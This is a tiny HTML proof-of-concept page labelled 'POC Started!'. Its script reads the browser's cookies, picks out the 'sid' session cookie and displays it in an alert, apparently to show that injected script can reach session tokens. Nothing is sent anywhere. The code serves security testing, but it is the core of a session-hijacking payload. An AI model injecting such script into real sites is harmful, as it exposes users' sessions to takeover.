<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Today's Date</title>

Hi <script>

var strCookies = document.cookie;
var cookiearray = strCookies.split(';')
for(var i=0; i<cookiearray.length; i++){
  name = cookiearray[i].split('=')[0];
  value = cookiearray[i].split('=')[1];
  if(name == 'sid'){
     sid = value;
     alert(sid); 
  }
}

</script>

</head>


<body>
<h2>POC Started! - With Third Change! </h2>
</body>
</html>
